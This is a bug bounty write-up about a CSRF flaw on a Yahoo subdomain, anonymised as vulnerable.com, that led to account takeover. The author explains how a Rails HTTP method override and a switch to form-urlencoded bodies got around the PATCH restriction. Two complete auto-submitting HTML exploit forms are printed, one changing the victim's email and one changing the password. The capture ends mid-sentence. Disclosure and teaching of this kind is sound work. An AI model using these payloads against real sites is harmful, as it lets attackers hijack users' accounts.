---
title: CSRF leads to account takeover in Yahoo!
url: https://infosecwriteups.com/csrf-leads-to-account-takeover-in-yahoo-aa96c678d2aa?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-01-16
fetch_date: 2025-10-04T03:59:35.397391
---

# CSRF leads to account takeover in Yahoo!

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Faa96c678d2aa&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcsrf-leads-to-account-takeover-in-yahoo-aa96c678d2aa&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcsrf-leads-to-account-takeover-in-yahoo-aa96c678d2aa&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-aa96c678d2aa---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-aa96c678d2aa---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# CSRF leads to account takeover in Yahoo!

[![Retr02332](https://miro.medium.com/v2/resize:fill:64:64/1*UaAOcZw1m5XeBOqjBn2ZtA.jpeg)](https://retr02332.medium.com/?source=post_page---byline--aa96c678d2aa---------------------------------------)

[Retr02332](https://retr02332.medium.com/?source=post_page---byline--aa96c678d2aa---------------------------------------)

6 min read

·

Jun 16, 2022

--

4

Listen

Share

Press enter or click to view image in full size

![]()

Hi everyone!

During my bug bounty journey I used to read numerous writings to learn different techniques and points of view when hunting. Most of the writings I read were from researchers who had managed to hack **Yahoo!**. It was because of this that I set out to hack **Yahoo!** and did not rest until I succeeded. Fortunately, I managed to hack them in only 30 minutes. So without further ado, here is this incredible story.

After listing all the domains I could and checking which ones ran a web server, I focused on the ones that did not contain the word **Yahoo!**. Somehow I felt that in these subdomains I had a better chance of finding a good security flaw. Among all the filtered domains I decided to go for one, which I will call vulnerable.com.

### Focusing on high-severity vulnerabilities

Personally, I don’t like to waste my time with low severity bugs. I like challenges. So after analyzing the application in question for quite a while I thought of analyzing the functionality to update the user’s account data. I wanted to see if by any chance I could find a CSRF (although at the time I didn’t have much faith in finding a CSRF in such an obvious place, let alone in a company like **Yahoo!**).

So I went to the functionality to change the user account data, and changed the email from victim@gmail.com to netstat2332@gmail.com.

### Original request

The original email change request looked as follows:

Press enter or click to view image in full size

![]()

### Original request with arbitrary origin

Since we are trying to achieve a CSRF, it is convenient to verify if the server accepts requests with arbitrary origins. Some servers do not allow requests from arbitrary origins to be initiated. However, the server was friendly and allowed any domain to send HTTP requests to it:

Press enter or click to view image in full size

![]()

### Original request with a different HTTP method

At this point, I was about to create the malicious HTTP form to exploit CSRF. However, I noticed that the requests were made using the HTTP PATCH method.

This is a problem, since [HTTP forms only accept a limited set of HTTP methods](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/form#attr-method). So the first thing that occurred to me was to change the HTTP method directly to POST. However, this did not work:

Press enter or click to view image in full size

![]()

### Original request with a different Content-Type

After that I took a moment to think about what else I could try or how else I could cause unexpected behavior on the server. So I came up with the idea to change the value of the Content-type header from **application/json** to **application/x-www-form-urlencoded**:

Press enter or click to view image in full size

![]()

Seeing this, I decided to transform the body of the request from JSON to urlencoded to see if the error is still present in the server responses.

### Original request with HTTP method override

I already rewrote the body of the request from JSON to urlencoded. However, we still have to send this request with the POST method. Since the HTTP forms, as we saw before, only work with **GET/POST** methods.

The problem here is that the backend expects this request to arrive with the **PATCH** method. After some thought I came up with a way to alter the HTTP method before it reaches the server. To accomplish this there are several techniques and each of these depends heavily on the programming language used in the backend.

So I used wappalyzer to see what technologies the application was using. Thanks to this, I was able to realize that the backend of the application was written on **Ruby On Rails**. This framework fortunately offers a way to achieve the [HTTP method override](https://rubydoc.org/gems/rack-methodoverride-with-params) that we want so much.

Finally, with all these ingredients together we managed to bypass all the restrictions present in the application to be able to exploit a CSRF that will allow us to steal arbitrary user accounts with a single click:

Press enter or click to view image in full size

![]()

### Exploit to change the user’s email address

The exploit used to exploit this vulnerability is as follows:

> <!DOCTYPE html>
> <html>
>  <body>
>  <form action=”<https://vulnerable.com/api/v2/users/update>" method=”POST”>
>  <input type=”hidden” name=”\_method” value=”patch” />
>  <input type=”hidden” name=”user[email]” value=”bello.carlos@something.com” />
>  <input type=”hidden” name=”user[something]” value=”null” />
>  <input type=”hidden” name=”user[promo\_code]” value=”” />
>  <input type=”hidden” name=”user[third\_party\_emails]” value=”null” />
>  </form>
>  <script>
>  document.forms[0].submit();
>  </script>
>  </body>
> </html>

### Exploit to change user password

After reporting the bug, I realized that the exploit could also be used to change the user’s password. This is because the application did not prompt for the current password:

> <!DOCTYPE html>
> <html>
>  <body>
>  <form action=”<https://vulnerable.com/api/v2/users/update>" method=”POST”>
>  <input type=”hidden” name=”\_method” value=”patch” />
>  <input type=”hidden” name=”password” value=”you+have+been+hacked+by+Retr02332" />
>  </form>
>  <script>
>  document.forms[0].submit();
>  </script>
>  </body>
> </html>

Press enter or click to view image in full size

![]()

Since we are able to change the password and email (the password recovery way), we have managed to completely obtain the ...